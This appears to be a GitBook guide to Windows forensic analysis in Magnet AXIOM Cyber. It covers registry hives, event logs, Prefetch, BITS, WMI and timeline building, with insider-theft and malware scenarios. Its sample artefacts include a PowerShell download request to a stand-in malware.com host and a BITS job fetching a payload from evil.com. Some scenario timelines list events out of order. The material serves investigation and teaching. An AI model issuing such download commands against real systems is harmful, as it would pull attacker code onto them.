---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Axiom Cyber Examiner

#### **Getting Started in AXIOM Examine** Objective: Orient yourself to the Windows evidence.

* #### Open Case: Load your processed Windows.mfdb file.
* Dashboard: Check artefact categories—e.g., “Windows Artefacts” (Registry, Prefetch), “PowerShell,” “Event Logs”—to scope the data.
* Key Views:
  * Artefact Explorer: Parsed data (e.g., USB history, Amcache).
  * File System Explorer: Raw files (C:\Windows\System32).
  * Timeline: Chronological events.
  * Connections: Entity relationships.

Example: Dashboard shows 1,000+ “Event Log” hits, 50 “PowerShell” entries, and 10 “USB Device” connections—prioritise accordingly.&#x20;

#### Core Analysis Workflow (Windows-Specific) Objective: Investigate systematically with Windows artefacts.

#### Step 1: Define Goals

* Example: “Did ‘jdoe’ exfiltrate ‘Q1Report.docx’ via USB on 15 January 2025?”

Step 2: Explore Key Windows Artefacts

* Windows Registry:
  * Location: Artefact Explorer > Windows > Registry.
  * Hives:
    * H<mark style="color:green;">KLM\SYSTEM\CurrentControlSet\Enum\USBSTOR</mark>: USB details (serial, connect time).
    * <mark style="color:green;">HKU\\\[SID]\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs</mark>: Recent files.
    * <mark style="color:green;">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</mark>: Autorun persistence.
  * Example: <mark style="color:green;">USBSTOR</mark> shows serial “1234ABCD” connected “2025-01-15 14:32:21 UTC.”
* Event Logs:
  * Location: Artefact Explorer > Windows > Event Logs.
  * Logs:
    * Security.evtx: Logons (ID 4624), failures (ID 4625).
    * System.evtx: Startups (ID 6005), service installs (ID 7045).
    * Application.evtx: App crashes or anomalies.
  * Example: ID 4624 logs “jdoe” at “14:30:00 UTC.”
* Prefetch Files:
  * Location: Artefact Explorer > Windows > Prefetch.
  * Purpose: Programme execution evidence.
  * Example: “WINRAR.EXE-1A2B3C4D.pf” ran “14:35:10 UTC,” referencing “Q1Report.zip.”
* LNK Files and Jump Lists:
  * Location: Artefact Explorer > Windows > LNK Files, Jump Lists.
  * Purpose: File access history.
  * Example: “Q1Report.docx.lnk” accessed “14:34:50 UTC.”
* Shimcache:
  * Location: Artefact Explorer > Windows > Shimcache.
  * Purpose: Historical executions.
  * Example: “cmd.exe” ran “14:36:00 UTC.”
* PowerShell Logs:
  * Location: Artefact Explorer > Windows > PowerShell.
  * Logs: Event ID 4104 (Script Block Logging), 4103 (command execution).
  * Example: “Invoke-WebRequest -Uri ‘[http://malware.com’”](http://malware.xn--com-to0aua) logged at “14:38:00 UTC.”
* Amcache:
  * Location: Artefact Explorer > Windows > Amcache.
  * Purpose: Tracks executable metadata (SHA1, install time).
  * Example: “notepad.exe” SHA1 matches a known dropper, executed “14:37:00 UTC.”
* BITS:
  * Location: Artefact Explorer > Windows > BITS Jobs.
  * Purpose: Background file transfers (e.g., malware downloads).
  * Example: BITS job downloaded “payload.exe” from “[http://evil.com”](http://evil.xn--com-9o0a) at “14:39:00 UTC.”
* WMI:
  * Location: Artefact Explorer > Windows > WMI.
  * Purpose: Persistence or remote execution (e.g., WMI Event Consumers).
  * Example: “WmiPrvSE.exe” triggered “cmd.exe” at “14:40:00 UTC.”
* SRUM:
  * Location: Artefact Explorer > Windows > SRUM.
  * Purpose: App usage and network activity.
  * Example: “winrar.exe” used 50MB at “14:35:00 UTC.”

Step 3: Build a Timeline

* Steps: Timeline view > Filter “2025-01-15 14:00:00 - 15:00:00 UTC” > Add “Event Logs,” “Prefetch,” “LNK,” "USB," and “PowerShell.”
* Example: Logon (14:30) → File access (14:34) → WinRAR (14:35) → USB (14:32).

Step 4: Correlate with Connections

* Steps: Tag “jdoe” and “1234ABCD” as Profiles > Map links (e.g., “jdoe” to “Q1Report.zip” to USB).
* Example: Visual confirms “jdoe” tied to file and USB.

#### Advanced Windows Analysis TechniquesObjective: Tackle complex or obscured evidence.

* Keyword Search:
  * Steps: Search > “Q1Report” or regex (e.g., \b\[A-Za-z0-9]{8}\b for serials).
  * Example: Hits in LNK, RecentDocs, and carved “Q1Report.zip.”
* File System Deep Dive:
  * Steps: File System Explorer > C:\Windows\System32\winevt\Logs or unallocated space.
  * Example: Recover deleted “cmd.exe-5D6E7F8G.pf” from unallocated space.
* Memory Analysis:
  * Steps: Artefact Explorer > Memory > Check processes and network connections.
  * Example: “cmd.exe” spawned “ftp.exe” at “14:37:00 UTC.”
* AXIOM Power Features:
  * Custom Artefacts: Define new parsers (e.g., for custom app logs) via AXIOM’s Artefact Definition tool.
  * Scripting: Batch tag artefacts with Python (e.g., all “PowerShell” hits as “suspicious”).
  * Example: Script tags 50 PowerShell commands in 10 seconds.
* Edge Cases:
  * Wiped Logs: Pivot to MFT (File System Explorer > $MFT) for file timestamps or memory for process history.
    * Example: MFT shows “Q1Report.zip” last modified “14:35:15 UTC” despite cleared logs.
  * Encrypted Drives: If BitLocker-locked, use the recovery key (if available) during acquisition; otherwise, analyse memory or cloud sync logs.
    * Example: OneDrive log shows “Q1Report.zip” uploaded “14:45:00 UTC.”

#### Interpreting Windows Evidence

* Context: USB + LNK + Prefetch = likely exfiltration.
  * Example: “Q1Report.zip” (14:35) + USB (14:32) suggests data theft.
* False Positives: Ignore “svchost.exe” Prefetch unless tied to user actions.
* Anomalies: Off-hours logins (e.g., 2:00 AM on 10 January) or rare tools (e.g., “psexec.exe”).

#### Reporting Windows Findings

* Tagging: Tag “Exfiltration Evidence” (USB, LNK).
* Visuals: Export Timeline PNG (14:30-14:40).
* Report: PDF with artefacts, notes, and raw logs (e.g., “ID 4624, jdoe, 14:30”).
* Portable Case: Share.mfc for collaboration.

#### Scenario Examples

* Insider Theft:
  * Findings: Logon (14:30)→ “Q1Report.docx” (14:34)→ WinRAR (14:35)→ USB “1234ABCD” (14:32).
  * Conclusion: “jdoe” exfiltrated data.
* Malware Infection:
  * Findings: BITS job downloads “payload.exe” (14:39) → Amcache logs execution (14:40) → PowerShell “Invoke-WebRequest” (14:38) → WMI persistence (14:40) → SRUM shows network spike (14:41).
  * Timeline:
    * 14:38: PowerShell downloads malware.
    * 14:39: BITS completes the transfer.
    * 14:40: WMI triggers execution.
  * Conclusion: Malware deployed via the web and persisted via WMI.

#### External Tool Integration

* Volatility: Export memory dump (File System Explorer) > Analyse with PSList or NetScan.
  * Example: “ftp.exe” connected to “192.168.1.100” confirms exfiltration.
* RegRipper: Export hives (e.g., SYSTEM) > Parse for deeper USB or Run key details.
  * Example: RegRipper finds “payload.exe” in Run key missed by AXIOM.

#### Validation

* Cross-Check: Registry USB times vs. raw USBSTOR hive.
* Raw Data: Export Security.evtx for external parsing (e.g., Event Log Explorer).

#### Windows-Specific Tips

* Filters: Exclude “SYSTEM” logons unless relevant.
* Registry Pivot: From USBSTOR to MountedDevices for drive letters.
* Batch Export: Multi-select Event Logs to CSV.

***
